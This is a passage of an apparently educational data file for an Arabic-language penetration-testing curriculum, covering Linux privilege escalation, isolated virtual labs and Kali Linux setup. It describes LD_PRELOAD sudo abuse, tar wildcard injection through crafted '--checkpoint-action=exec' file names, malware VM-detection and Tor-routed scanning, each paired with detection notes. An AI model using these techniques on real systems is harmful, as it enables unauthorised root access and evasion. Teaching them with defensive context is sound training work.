        explanation: 'إذا وُجدت صلاحية sudo لمستخدم لتشغيل أمر مع الحفاظ على متغيرات البيئة (env_keep += LD_PRELOAD في /etc/sudoers)، يمكن للمهاجم كتابة مكتبة C بسيطة (.so) تحتوي على دالة _init() وتمريرها عبر LD_PRELOAD ليتم حقنها وتنفيذها بصلاحية root فور استدعاء الأمر.',
        detection: 'يقوم نظام التشغيل لينكس بحظر LD_PRELOAD تلقائياً للبرمجيات التي تحمل SUID، ويرصد مسؤولو الـ SOC وجود سطر env_keep المشبوه في ملف sudoers عند إجراء الفحص الدوري.',
        link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path',
        linkText: 'دليل HackTricks لاستغلال وتأمين متغيرات LD_PRELOAD في أنظمة لينكس'
      },
      {
        title: 'استغلال علامات Wildcards في أوامر مهام الجدولة (Cron Jobs Wildcard Injection)',
        mitreId: 'T1053.003',
        category: 'Execution & Privilege Escalation',
        explanation: 'عندما يقوم سكربت مجدول (Cron Job) بتشغيل أمر مثل tar czf backup.tar.gz * داخل مجلد قابل للكتابة، فإن رمز الـ * يتمدد ليشمل أسماء الملفات. إذا أنشأ المهاجم ملفات بأسماء مثل --checkpoint=1 و --checkpoint-action=exec=shell.sh، فإن tar سيعاملها كـ Flags لتنفيذ السكربت بصلاحيات مشغل المهمة.',
        detection: 'ترصد حلول الـ Host IDS وسجلات crontab محاولات إنشاء ملفات تبدأ بشرطة (--) داخل مجلدات الأعمال والمجلدات العامة.',
        link: 'https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt',
        linkText: 'ورقة بحث DefenseCode التاريخية حول هجمات Unix Wildcards Gone Wild'
      }
    ],
    checklist: [
      { id: 'c4_1', text: 'فهم شجرة ملفات لينكس ودور كل مجلد حساس (/etc, /var/log, /tmp, /dev/shm).' },
      { id: 'c4_2', text: 'إتقان تعديل الصلاحيات (rwx) بالحسابات الثنائية والرمزية ومفهوم SUID/SGID.' },
      { id: 'c4_3', text: 'القدرة على فلترة السجلات والمخرجات باستخدام grep و awk و sed و pipes.' }
    ],
    officialResources: [
      { name: 'OverTheWire: Bandit (The Best Linux Command-Line Wargame)', url: 'https://overthewire.org/wargames/bandit/', type: 'Labs' },
      { name: 'Linux Journey (Structured Guides)', url: 'https://linuxjourney.com', type: 'Guides' },
      { name: 'GTFOBins (Linux Binaries Exploitation Database)', url: 'https://gtfobins.github.io', type: 'Cheatsheet' }
    ]
  },

  {
    id: 5,
    zoneId: 'zone-terminal',
    titleAr: 'المرحلة 5: المختبرات الافتراضية وشبكات العزل (Virtualization & Isolated Lab Architecture)',
    titleEn: 'Stage 5: Virtualization, Hypervisors & Isolated Lab Architecture',
    tag: 'Lab Architecture',
    difficulty: 'متوسط',
    xpReward: 350,
    position: { x: -25, y: 0, z: 0 },
    brief: 'بناء مختبر الاختراق المنزلي الاحترافي والمعزول بالكامل: مقارنة أنظمة الـ Type-1 vs Type-2 Hypervisors (VMware Workstation vs VirtualBox vs Proxmox)، إعداد شبكات الـ Host-Only و NAT Network، والتعامل الآمن مع الثغرات والبرمجيات الخبيثة.',
    whyLearn: 'ممنوع منعاً باتاً ممارسة أي اختبار اختراق أو تجربة برمجيات خبيثة على جهازك الشخصي مباشرة أو على شبكة الإنترنت المنزلية. بناء مختبر افتراضي معزول يمنحك بيئة آمنة للتجربة والخطأ دون عواقب.',
    professionalApplication: 'يستخدمه مستشارو الريد تيم في محاكاة بيئات الشركات قبل الهجوم عليها، واختبار مدى ثبات الـ Payloads، وتدريب الفرق في لابات داخلية مطابقة لبيئة الهدف.',
    caseStudy: 'حوادث هروب البرمجيات الخبيثة من أجهزة الباحثين وإصابة أجهزة أفراد عائلاتهم على نفس شبكة الواي فاي المنزلية بسبب استخدام نمط الشبكة Bridged Mode بدلاً من Host-Only أو شبكة معزولة بنظام جدار ناري.',
    commonMistakes: [
      'ضبط كارت شبكة الأجهزة الافتراضية على Bridged Mode، مما يجعل الضحية والمهاجم مكشوفين لجميع أجهزة المنزل والراوتر الرئيسي.',
      'نسيان أخذ نقاط استعادة (Snapshots) قبل تنفيذ أي هجوم أو تشغيل برمجية غير موثوقة، مما يضطرك لإعادة تثبيت المختبر بالكامل عند حدوث عطل.',
      'تخصيص كل موارد الجهاز (RAM/CPU) للماكينة الافتراضية مما يؤدي لتجمد نظام التشغيل المضيف.'
    ],
    detailedGuide: `
### 1. أنواع محاكيات الأنظمة الافتراضية (Hypervisors)
* **Type-1 (Bare Metal):** يُثبت مباشرة على عتاد السيرفر دون نظام تشغيل وسيط، مثل Proxmox VE و VMware ESXi. يوفر أداءً خارقاً وعزلاً صناعياً.
* **Type-2 (Hosted):** يُثبت كتطبيق داخل نظام التشغيل (ويندوز أو ماك)، مثل VMware Workstation Pro (المجاني الآن للاستخدام الشخصي) و Oracle VirtualBox. ممتاز للمبتدئين ومختبرات اللابتوب.

### 2. هندسة شبكات الأجهزة الافتراضية (Virtual Networking Modes)
1. **NAT Mode:** الجهاز الافتراضي يخرج للإنترنت عبر عنوان الـ IP للجهاز المضيف، ولكن أجهزة الشبكة الخارجية لا تستطيع رؤيته أو الوصول إليه.
2. **Bridged Mode:** يأخذ الجهاز الافتراضي IP مستقل من راوتر منزلك كأنه جهاز فيزيائي متصل بجانبه (غير موصى به للضحايا والمصائد).
3. **Host-Only / Internal Only:** شبكة داخلية معزولة تماماً لا تملك اتصالاً بالإنترنت ولا يراها سوى الأجهزة الافتراضية على نفس الكارت الافتراضي (البيئة المثالية للهجمات وتفجير الثغرات).
4. **NAT Network:** تتيح لعدة أجهزة افتراضية (المهاجم والضحايا والسيرفر) التحدث مع بعضها مع إمكانية خروجها المشترك للإنترنت لتحديث الأدوات.

### 3. استراتيجية نقاط الاستعادة (Snapshot Strategy)
قبل تشغيل أي سيناريو هجومي أو اختبار أداة غير موثوقة:
1. التقط Snapshot باسم "Clean State".
2. نفّذ هجومك وسجل نتائجك.
3. بعد الانتهاء، ارجع بنقرة واحدة إلى الحالة النظيفة للتأكد من عدم ترك مخلفات أو برمجيات خبيثة في الذاكرة.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'تثبيت وضبط كارت الشبكة الافتراضي المعزول (Custom NAT Network)',
        desc: 'ضبط شبكة افتراضية داخلية مشتركة تتيح لماكينة كالي ولماكينة الضحية (مثل Metasploitable) الاتصال معاً دون كشفهما لشبكة منزلك.',
        command: 'echo "في VMware: افتح Virtual Network Editor -> اضغط Change Settings -> اختر VMnet8 (NAT) -> Subnet: 10.10.10.0 -> فعل DHCP Settings"',
        flags: [
          { flag: 'VMnet8', explanation: 'الكارت المخصص لشبكة الـ NAT الداخلية المعزولة' },
          { flag: 'Subnet IP', explanation: 'النطاق الخاص 10.10.10.0/24 لمحاكاة بيئة شركات واقعية' }
        ],
        expectedOutput: `Network configuration saved: VMnet8 NAT Network active on 10.10.10.0/24 (Gateway: 10.10.10.2)`,
        proTip: 'عزل الماكينات الضعيفة عمداً (Vulnerable VMs) في نطاق NAT منفصل يمنع المخترقين على الإنترنت من الوصول إليها أو استغلالها كنقطة انطلاق لشبكتك المنزلية.'
      },
      {
        step: 2,
        title: 'أخذ Snapshot أساسي نظيف للماكينة الافتراضية',
        desc: 'حفظ حالة الماكينة قبل بدء أي اختبار لتتمكن من استعادتها فوراً بضغطة زر واحدة في حال تلف أي خدمة.',
        command: 'echo "[*] Take Snapshot: VM -> Snapshot -> Take Snapshot -> Name: Clean-Baseline -> Done."',
        flags: [
          { flag: 'Clean-Baseline', explanation: 'نقطة البداية النظيفة مع النظام المحدث والأدوات المثبتة' }
        ],
        expectedOutput: `Snapshot created successfully: Clean-Baseline`,
        proTip: 'التقط دائماً Snapshot بعد الانتهاء من التحديثات وتثبيت أدواتك المفضلة مباشرة وقبل أن تبدأ في تشغيل أول أداة هجومية.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Build the ULTIMATE Ethical Hacking Lab (VMware & Kali)',
        channel: 'NetworkChuck',
        duration: '28 دقيقة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'خطوات عملية سهلة لتثبيت برنامج المحاكاة وإنشاء شبكات معزولة وتثبيت كالي.'
      },
      {
        title: 'How to Build an Active Directory Pentesting Lab at Home',
        channel: 'The Cyber Mentor',
        duration: '40 دقيقة',
        url: 'https://www.youtube.com/watch?v=wQ8bb7q5r3c',
        keyTakeaway: 'بناء سيرفر ويندوز دومين كنترولر كامل على لابتوبك لاختبار هجمات الشركات.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Introduction to Virtualisation', url: 'https://tryhackme.com/r/room/virtualisationintro', difficulty: 'Easy', whyMatters: 'فهم كيف تعمل الماكينات الافتراضية وتقسيم الذاكرة والمعالجات الافتراضية.' },
      { name: 'OpenVPN Connection Guide', url: 'https://tryhackme.com/r/room/openvpn', difficulty: 'Easy', whyMatters: 'ربط كالي بلابات وسيرفرات TryHackMe عبر النفق الافتراضي بأمان.' }
    ],
    writeup: {
      title: 'بناء واختبار شبكة معملية معزولة متعددة النطاقات (Isolated Multi-Segment Lab Architecture)',
      scenario: 'بناء معمل تدريبي هجومي/دفاعي متكامل معزول تماماً عن الشبكة الحقيقية: إعداد موجه افتراضي (pfSense)، وإنشاء ثلاث شبكات افتراضية مستقلة (Management Subnet لمحطة كالي، DMZ للخوادم الضحية، و Internal Corporate Network لخدمات الدومين كنترولر)، مع فرض جدران حماية صارمة لمنع تسريب الحزم إلى الإنترنت المنزلي.',
      steps: [
        {
          phase: 'Phase 01: Hypervisor Virtual Switch Configuration & VLAN Isolation',
          title: 'إنشاء المحولات الافتراضية وتقسيم النطاقات الشبكية',
          action: 'تم إنشاء 3 شبكات افتراضية من نوع Host-Only / Custom VMnet (مثل VMnet2, VMnet3, VMnet4) داخل برنامج المحاكاة (VMware Workstation / VirtualBox) وتعيين نطاقات IP فرعية متباينة لكل شبكة لمنع الاتصال المباشر بينها بدون موجه.',
          detection: 'تقوم أنظمة مراقبة الشبكات الداخلية بفحص جداول الـ ARP للتأكد من عدم وجود أي حزم تتسرب إلى كارت الشبكة الفيزيائي الخارجي (Physical NIC).',
          mitreId: 'T1596',
          link: 'https://docs.vmware.com/en/VMware-Workstation-Pro/index.html',
          linkText: 'التوثيق الرسمي لمعمارية الشبكات الافتراضية في VMware Workstation Pro'
        },
        {
          phase: 'Phase 02: pfSense Gateway Setup & Egress Filtering',
          title: 'نشر راوتر pfSense وتفعيل جدار الحماية وقواعد العزل الصارم',
          action: 'تثبيت نظام pfSense وتعيين واجهات WAN و LAN و DMZ، وضبط قواعد الفايروول لحظر خروج أي ترافيك غير مرخص (Outbound Egress Drop) من الأجهزة الضحية إلى شبكة الإنترنت الحقيقية، مع السماح فقط بالتوجيه الداخلي الخاضع للمراقبة.',
          detection: 'تسجل سجلات pfSense System Logs (Filter Logs) أي محاولة من الأنظمة الضحية لإرسال حزم استكشافية أو طلبات DNS إلى خارج نطاق المعمل وتغلقها فورياً.',
          mitreId: 'T1562.004',
          link: 'https://docs.netgate.com/pfsense/en/latest/',
          linkText: 'دليل Netgate الرسمي لإعداد وتأمين جدار الحماية pfSense'
        },
        {
          phase: 'Phase 03: Deploying Vulnerable Targets & Golden Baseline Snapshots',
          title: 'تثبيت الأهداف الأمنية وحفظ اللقطات المرجعية النظيفة',
          action: 'تم نشر خوادم Metasploitable و Windows Server 2022 وتعيين عناوين IP ثابتة لكل منها، والتقاط Snapshot مرجعي نظيف (Clean Golden Image) لكل ماكينة بعد اكتمال التحديثات لضمان إمكانية الرجوع للحالة السليمة في ثوانٍ.',
          detection: 'يتم فحص الـ Hashes الخاصة بملفات الـ Virtual Disks للتأكد من تطابق الحالة المرجعية بعد انتهاء كل تدريب ومحو أي تعديلات أو ملفات خلفية متبقية.',
          mitreId: 'T1584',
          link: 'https://docs.metasploit.com/docs/using-metasploit/intermediate-metasploit/metasploitable-2.html',
          linkText: 'دليل تثبيت وتكوين بيئة الأهداف التدريبية Metasploitable'
        },
        {
          phase: 'Phase 04: Packet Leakage Verification & Network Segregation Audit',
          title: 'التحقق العملي من انعدام تسريب الحزم بواسطة Wireshark',
          action: 'تشغيل Wireshark على كارت الشبكة الفيزيائي للحاسب المضيف أثناء تنفيذ فحوصات Nmap مكثفة داخل المعمل للتأكد من أن 0 حزمة تتسرب إلى شبكة المنزل أو الـ Wi-Fi الحقيقي.',
          detection: 'تؤكد السجلات الشبكية أن حركة المرور الهجومية محصورة بنسبة 100% داخل مسارات الـ Virtual Switches ولا تثير أي إنذارات لدى موفر خدمة الإنترنت (ISP).',
          mitreId: 'T1040',
          link: 'https://attack.mitre.org/techniques/T1040/',
          linkText: 'توثيق تقنيات فحص واعتراض حركة المرور الشبكية في MITRE ATT&CK'
        }
      ],
      lessonLearned: 'إجراء تجارب الريد تيم في بيئة Bridged متصلة بالإنترنت المنزلي خطر حقيقي قد يسرب برمجيات هجومية أو يطلق تنبيهات من موفر خدمة الإنترنت (ISP). العزل التام عبر شبكات Host-Only المدارة بجدار ناري افتراضي هو المعيار الاحترافي الإلزامي.'
    },
    secretTradecraft: [
      {
        title: 'كشف بيئات المحاكاة الافتراضية والـ Sandboxes من قبل البرمجيات الخبيثة (VM Detection Techniques)',
        mitreId: 'T1497.001',
        category: 'Anti-Analysis & Evasion',
        explanation: 'تقوم البرمجيات الخبيثة المتقدمة بفحص وجود ملفات تعريف VMware Tools أو VirtualBox Guest Additions، وفحص أسماء الـ BIOS وعناوين MAC التي تبدأ بـ 00:05:69 أو 08:00:27، وفحص عدد أنوية المعالج (أقل من 2 أنوية) وحجم الذاكرة؛ فإذا اكتشفت أنها تعمل داخل ماكينة افتراضية، تُنهي نفسها فوراً أو تغير سلوكها لمنع التحليل.',
        detection: 'يقوم محللو البرمجيات الخبيثة بتعديل ملفات إعدادات الـ VM (.vmx) بإضافة خيارات إخفاء المحاكاة مثل monitor_control.restrict_backdoor = "TRUE" وتعديل سجلات الـ Registry لتضليل برامج الفحص.',
        link: 'https://attack.mitre.org/techniques/T1497/001/',
        linkText: 'توثيق تقنيات كشف بيئات المحاكاة وفحص المحلل في إطار MITRE ATT&CK'
      },
      {
        title: 'منع تسريب حزم الـ DNS خارج المعمل المعزول (DNS Leak Prevention via Dedicated DNS)',
        mitreId: 'T1071.004',
        category: 'Operational Security (OpSec)',
        explanation: 'عند فحص أسماء نطاقات أو عناوين IP داخل المعمل، قد يقوم نظام التشغيل المضيف بإرسال استعلامات DNS عبر راوتر المنزل إلى خوادم DNS العامة (مثل 8.8.8.8)، مما يفضح طبيعة الأهداف التي تختبرها. يتم منع هذا التسريب بتخصيص خادم DNS داخلي داخل pfSense وحظر منافذ UDP 53 إلى الخارج نهائياً.',
        detection: 'يتم الكشف عن تسريبات الـ DNS بمراقبة حركة المرور على المنفذ 53 باستخدام أداة tcpdump على كارت الشبكة الفيزيائي للجهاز المضيف.',
        link: 'https://www.dnsleaktest.com/',
        linkText: 'أداة واختبارات فحص وكشف تسريبات استعلامات الـ DNS'
      },
      {
        title: 'إدارة اللقطات السريعة المؤتمتة عبر سطر الأوامر (VBoxManage / vmrun CLI Snapshots)',
        mitreId: 'T1562',
        category: 'Lab Automation & Rapid Recovery',
        explanation: 'بدلاً من فتح الواجهة الرسومية يدوياً لأخذ اللقطات، يستخدم مهندسو الأمان سطر الأوامر لأتمتة إعادة ضبط المعمل بالكامل عبر سكربت باش بسيط يستدعي: vmrun -T ws revertToSnapshot "target.vmx" "Clean-Baseline"، مما يعيد ضبط عشرات الماكينات إلى حالتها النظيفة بعد انتهاء كل تدريب أو اختبار آلياً.',
        detection: 'ترصد سجلات نظام التشغيل المضيف استدعاءات برمجيات Hypervisor CLI وتوثق أوقات استعادة اللقطات السريعة.',
        link: 'https://www.virtualbox.org/manual/ch08.html',
        linkText: 'دليل استخدام سطر الأوامر VBoxManage للتحكم بالماكينات واللقطات الافتراضية'
      }
    ],
    checklist: [
      { id: 'c5_1', text: 'فهم الفرق بين Type-1 و Type-2 Hypervisors وسيناريو استخدام كل منهما.' },
      { id: 'c5_2', text: 'إتقان إعداد أنماط الشبكات الافتراضية (NAT, Bridged, Host-Only, Custom Subnets).' },
      { id: 'c5_3', text: 'الاعتياد على أخذ Snapshots نظيفة قبل كل سيناريو هجومي.' }
    ],
    officialResources: [
      { name: 'VMware Workstation Pro Personal Use Documentation', url: 'https://www.vmware.com', type: 'Documentation' },
      { name: 'VirtualBox Official Manual', url: 'https://www.virtualbox.org/manual/', type: 'Documentation' }
    ]
  },

  {
    id: 6,
    zoneId: 'zone-terminal',
    titleAr: 'المرحلة 6: تثبيت وتجهيز كالي لينكس الاحترافي (Kali Linux Weaponization)',
    titleEn: 'Stage 6: Kali Linux Deployment, Customization & Post-Install Hardening',
    tag: 'Kali Linux',
    difficulty: 'متوسط',
    xpReward: 350,
    position: { x: -15, y: 0, z: 0 },
    brief: 'الدليل التقني الشامل لتثبيت كالي لينكس (Bare Metal vs VM vs WSL2)، مقارنة نسخ التثبيت (Installer vs Pre-built VM Image)، تجهيز أدوات الضيافة (Guest Additions)، تخصيص واجهة Zsh، ضبط مستودعات التحديث الرسمية، وإعداد قواميس التخمين العالمية (SecLists & RockYou).',
    whyLearn: 'كالي لينكس هي منصة العمل القياسية في صناعة الأمن السيبراني المحملة بأكثر من 600 أداة متخصصة. تثبيتها وإعدادها بشكل سليم وتخصيص بيئتها يوفر عليك مئات الساعات من مشاكل التوافق ونقص المكتبات والبيئات الافتراضية.',
    professionalApplication: 'يستخدمها مهندس الريد تيم كمنصة إطلاق للعمليات ومحاكاة الاختراق وتحليل البرمجيات وتخزين أدوات الـ C2 وإجراء عمليات الفحص والاستطلاع واستخراج الأدلة الجنائية.',
    caseStudy: 'كثير من المبتدئين يقومون بتحميل كالي من روابط غير رسمية أو مستودعات خارجية تحوي برمجيات تروجان معدلة مسبقاً، مما يجعل جهاز المهاجم نفسه مخترقاً ومكشوفاً!',
    commonMistakes: [
      'تحميل كالي وتحديثه باستخدام مستودعات ديبيان العادية بدلاً من مستودعات كالي الرسمية (Official Rolling Mirrors)، مما يكسر حزم النظام بالكامل.',
      'تجاهل تثبيت بيئة بايثون الافتراضية (venv) مما يسبب خطأ externally-managed-environment في إصدارات كالي الحديثة.',
      'تخصيص حجم قرص صلب صغير (أقل من 40 جيجابايت) مما يؤدي لامتلاء القرص فجأة أثناء التحديثات الكبيرة.'
    ],
    detailedGuide: `
### 1. خيارات التثبيت: أيهما تختار؟
* **نسخة الماكينة الجاهزة (Pre-built VM Image):** خيار يُنصح به بشدة! ملف مضغوط بصيغة 7z/OVA من موقع كالي الرسمي، يحتوي على نظام مثبت ومضبوط وجاهز للتشغيل مباشرة على VMware أو VirtualBox مع أدوات الضيافة مسبقة التثبيت في ثوانٍ.
* **نسخة التثبيت الكامل (Installer ISO):** مناسبة إذا أردت تثبيت كالي كنظام أساسي وحيد (Bare Metal) على اللابتوب للاستفادة الكاملة من كارت الشاشة في كسر كلمات السر (GPU Cracking)، ولكنها تتطلب ضبط خطوات التقسيم يدوياً.
* **WSL2 (Windows Subsystem for Linux):** ممتازة للمهام السريعة داخل ويندوز دون واجهة ثقيلة، لكنها تعاني من قيود في التعامل مع كروت الشبكة الخارجية وأدوات الوايفاي.

### 2. خطوات ما بعد التثبيت الأساسية (Post-Install Weaponization)
1. **تحديث المستودعات وترقية النظام بالكامل:**
\`\`\`bash
sudo apt update && sudo apt dist-upgrade -y
sudo apt autoremove -y
\`\`\`
2. **تجهيز بيئة بايثون الافتراضية المعزولة:**
لتفادي أخطاء تثبيت أدوات GitHub في كالي الحديث.
3. **فك ضغط قاموس rockyou.txt وتثبيت حزمة SecLists العالمية:**
\`\`\`bash
sudo apt install -y seclists
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
\`\`\`
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'ترقية المستودعات وتثبيت حزم التطوير الأساسية',
        desc: 'تحديث النظام بالكامل والتأكد من تثبيت الحزم البرمجية التي تحتاجها كل أدوات GitHub.',
        command: 'sudo apt update && sudo apt install -y git curl wget build-essential python3-pip python3-venv zsh tmux htop seclists',
        flags: [
          { flag: 'update', explanation: 'تحديث قائمة الحزم من مستودعات كالي الرسمية' },
          { flag: 'python3-venv', explanation: 'دعم إنشاء بيئات بايثون الافتراضية لتثبيت الأدوات بأمان' },
          { flag: 'seclists', explanation: 'أضخم مكتبة قواميس أمنية في العالم تضم مسارات الويب وكلمات السر' }
        ],
        expectedOutput: `Reading package lists... Done
Building dependency tree... Done
Calculating upgrade... Done
seclists is already the newest version (2024.1).
0 upgraded, 0 newly installed, 0 to remove.`,
        proTip: 'احرص على ألا تقوم بعمل apt-get install python-is-python2 لأن بايثون 2 تم إيقافه تماماً، وكل أدوات الريد تيم الحديثة تعتمد حصراً على Python 3.'
      },
      {
        step: 2,
        title: 'تجهيز وفك ضغط قاموس كلمات السر العالمي RockYou',
        desc: 'القاموس المعتمد رقم 1 في جميع اختبارات eJPTv2 و OSCP وتحديات CTF لكسر الـ Hashes وتخمين كلمات السر.',
        command: 'ls -lh /usr/share/wordlists/rockyou.txt 2>/dev/null || sudo gzip -d /usr/share/wordlists/rockyou.txt.gz',
        flags: [
          { flag: 'rockyou.txt', explanation: 'قاموس يضم أكثر من 14 مليون كلمة سر حقيقية مسربة' },
          { flag: 'gzip -d', explanation: 'فك ضغط الملف المضغوط ليصبح جاهزاً للاستخدام المباشر في أدوات Hydra و John' }
        ],
        expectedOutput: `-rw-r--r-- 1 root root 134M Feb 12 10:15 /usr/share/wordlists/rockyou.txt`,
        proTip: 'مسار القاموس القياسي في كالي هو /usr/share/wordlists/rockyou.txt. احفظ هذا المسار غيباً لأنك ستكتبه في عشرات الأوامر لاحقاً.'
      }
    ],
    youtubeVideos: [
      {
        title: 'Top 10 Things to do AFTER Installing Kali Linux',
        channel: 'NetworkChuck',
        duration: '19 دقيقة',
        url: 'https://www.youtube.com/watch?v=sWbGOq-IrN4',
        keyTakeaway: 'خطوات ضبط المستودعات وتثبيت الأدوات الأساسية وتأمين الماكينة بعد التثبيت مباشرة.'
      },
      {
        title: 'How to Customize Kali Linux Terminal like a Pro (Zsh & Tmux)',
        channel: 'David Bombal',
        duration: '22 دقيقة',
        url: 'https://www.youtube.com/watch?v=lb1Dw0elw0Q',
        keyTakeaway: 'تخصيص الشاشة وتقسيم التيرمينال عبر tmux لفتح عدة جلسات هجومية متزامنة.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Kali Linux Basics', url: 'https://tryhackme.com/r/room/kalilinux', difficulty: 'Easy', whyMatters: 'التعرف على توزيعة كالي وأهم تصنيفات الأدوات في القائمة الرئيسية.' },
      { name: 'Linux Modules', url: 'https://tryhackme.com/r/room/linuxmodules', difficulty: 'Easy', whyMatters: 'إتقان حزم لينكس والتعامل مع الخدمات والـ Daemons.' }
    ],
    writeup: {
      title: 'تجهيز وتأمين محطة كالي لينكس وبناء بيئة أدوات آمنة (Hardened Offensive Workstation Setup)',
      scenario: 'تجهيز وتأمين محطة اختبار اختراق احترافية على كالي لينكس: التحقق من التوقيع الرقمي للمستودعات، عزل أدوات بايثون داخل بيئات افتراضية (venv) لمنع تضارب المكتبات، فك تشفير وتجهيز قواميس SecLists، تفعيل تشفير القرص الكامل (LUKS)، وضبط سجلات تتبع الأوامر لمساءلة التدقيق القانوني.',
      steps: [
        {
          phase: 'Phase 01: Repository Verification & Cryptographic Hash Auditing',
          title: 'التحقق من سلامة مفاتيح التوقيع الرقمي للمستودعات',
          action: 'تم التحقق من بصمات مفاتيح التوقيع الرقمي (GPG Release Keys) لمستودعات كالي الرسمية عبر: apt-key verify للتأكد من عدم تعرض التوزيعة لأي هجوم رجل في المنتصف (Repository Hijacking) أثناء تحميل الحزم.',
          detection: 'ترصد أنظمة إدارة التحديثات الأمنية أي مفاتيح مستودعات خارجية غير موثوقة في /etc/apt/sources.list.d/ وتطلق تحذيرات أمان فورية.',
          mitreId: 'T1588.001',
          link: 'https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/',
          linkText: 'التوثيق الرسمي لمستودعات كالي لينكس المعتمدة والتحقق من التوقيع'
        },
        {
          phase: 'Phase 02: Python Virtual Environments & Dependency Isolation',
          title: 'عزل الأدوات البرمجية داخل بيئات بايثون افتراضية مستقلة',
          action: 'تطبيق معايير PEP 668 عبر إنشاء بيئات افتراضية مخصصة لكل أداة أمنية باستخدام: python3 -m venv /opt/tools/env وتثبيت المتطلبات دون المساس بمكتبات النظام الأساسية، مما يمنع تعطل أدوات الفحص الحيوية في الميدان.',
          detection: 'يتم رصد الاعتماديات غير المتوافقة والمكتبات القديمة عبر أدوات فحص الحزم والـ Software Composition Analysis (SCA).',
          mitreId: 'T1059.006',
          link: 'https://peps.python.org/pep-0668/',
          linkText: 'معايير PEP 668 الرسمية لعزل بيئات بايثون وحماية حزم نظام التشغيل'
        },
        {
          phase: 'Phase 03: Arsenal Optimization & SecLists Standardization',
          title: 'تجهيز القواميس القياسية وفك ضغط RockYou وتنسيق مسارات الفحص',
          action: 'تثبيت حزمة SecLists القياسية في /usr/share/seclists وفك ضغط قاموس rockyou.txt (14 مليون كلمة سر)، وضبط اختصارات سريعة (Aliases) في ملف .zshrc لتسريع استدعاء قوائم التخمين الأكثر استخداماً في عمليات التدقيق.',
          detection: 'ترصد حلول مراقبة الملفات (File Integrity Monitoring) وجود قواميس التخمين الضخمة في مسارات النظام كإشارة على طبيعة استخدام محطة العمل كجهاز اختبار أمني.',
          mitreId: 'T1588.002',
          link: 'https://github.com/danielmiessler/SecLists',
          linkText: 'مستودع SecLists المرجعي العالمي لقواميس كلمات السر ومسارات الويب'
        },
        {
          phase: 'Phase 04: Local Hardening & Disk Encryption Verification',
          title: 'تأمين محطة العمل وتفعيل التشفير الكامل لحماية بيانات العملاء',
          action: 'التأكد من تفعيل التشفير الكامل للقرص (LUKS AES-XTS-512) لحماية تقارير الفحص والبيانات المستخرجة في حال فقدان أو سرقة الحاسب المحمول، مع تعطيل تسجيل الدخول المباشر لحساب root واستخدام مستخدم عادي مقيد مع sudo.',
          detection: 'يتم تدقيق حالة التشفير عبر أمر cryptsetup status وتوثيق الامتثال لمعايير الأمان المادية (Physical Device Security Guidelines).',
          mitreId: 'T1562.001',
          link: 'https://gitlab.com/cryptsetup/cryptsetup',
          linkText: 'التوثيق التقني لمعيار تشفير الأقراص الموحد في لينكس (LUKS)'
        }
      ],
      lessonLearned: 'محطة العمل الهجومية نفسها هي هدف جذاب للمهاجمين؛ تشغيل أدوات مجهولة المصدر من الإنترنت بصلاحيات root دون فحص أو تشفير للقرص يعرض بيانات عملاء التدقيق والتقارير السرية لخطر التسريب الحتمي.'
    },
    secretTradecraft: [
      {
        title: 'فحص أدوات GitHub مفتوحة المصدر بحثاً عن الأبواب الخلفية (Supply Chain Backdoors in Tools)',
        mitreId: 'T1195.001',
        category: 'Offensive Supply Chain Security',
        explanation: 'يقوم مجرمو الإنترنت بنشر أدوات اختبار اختراق و PoC مزيفة على GitHub تحتوي على كود بايثون خفي يقوم بسرقة مفاتيح SSH و Discord tokens من جهاز الباحث الأمني بمجرد تشغيلها. يقوم المحترفون بفحص كود الأداة عبر البحث عن دوال مشبوهة مثل exec(), eval(), base64.b64decode(), والاتصالات الشبكية المشفرة قبل تثبيتها.',
        detection: 'ترصد أدوات فحص الشيفرة البرمجية مثل Bandit للـ Python ومحركات الـ Static Analysis استدعاءات الشبكة غير المبررة داخل أدوات اختبار الأمان.',
        link: 'https://attack.mitre.org/techniques/T1195/001/',
        linkText: 'توثيق تقنيات استهداف سلاسل الإمداد البرمجية في MITRE ATT&CK'
      },
      {
        title: 'توجيه حركة أدوات سطر الأوامر عبر البروكسي المشفر (Proxychains & Tor Routing)',
        mitreId: 'T1090.003',
        category: 'Network Anonymity & Evasion',
        explanation: 'عبر استخدام أداة proxychains مع شبكة Tor أو خوادم SOCKS5 وسيطة، يتم إجبار أدوات مثل Nmap أو Curl على توجيه كافة حزم TCP عبر نفق مشفر، مما يمنع الهدف من رؤية عنوان IP الحقيقي لجهاز الاختبار في سيناريوهات الاستطلاع الحساسة.',
        detection: 'ترصد فرق الـ SOC الاتصالات القادمة من عقد خروج تور المعروفة (Tor Exit Nodes) وتصنفها فورياً كـ High Risk Traffic وتفرض عليها حظراً تلقائياً.',
        link: 'https://github.com/haad/proxychains',
        linkText: 'مستودع أداة Proxychains الرسمية لتوجيه اتصالات البرمجيات عبر وسائط بروكسي'
      },
      {
        title: 'أرشفة وتوثيق أوامر التيرمينال للمساءلة القانونية (Offensive Session Logging via Script / Tmux)',
        mitreId: 'T1005',
        category: 'Professional Accountability & Reporting',
        explanation: 'باستخدام أمر script -a engagement_log.txt أو تسجيلات tmux sessions، يتم توثيق كل حرف وأمر ومخرج في التيرمينال مع الـ Timestamp الدقيق، وهو إجراء قانوني لا غنى عنه لإثبات ما تم وما لم يتم تنفيذه خلال ساعات العمل المتفق عليها مع العميل.',
        detection: 'تستخدم فرق التحقيق والمراجعة الداخلية هذه السجلات للمطابقة مع تنبيهات الـ SIEM والتحقق من الجدول الزمني للعملية بدقة متناهية.',
        link: 'https://man7.org/linux/man-pages/man1/script.1.html',
        linkText: 'دليل استخدام أمر script لتوثيق وتسجيل جلسات سطر الأوامر بالكامل'
      }
    ],
    checklist: [
      { id: 'c6_1', text: 'تحميل كالي لينكس من المصدر الرسمي kali.org والتحقق من بصمة الـ SHA256.' },
      { id: 'c6_2', text: 'إجراء التحديث الكامل وترقية المستودعات الرسمية (apt update && apt dist-upgrade).' },
      { id: 'c6_3', text: 'فك ضغط قاموس rockyou.txt وتثبيت حزمة SecLists في المسار القياسي.' },
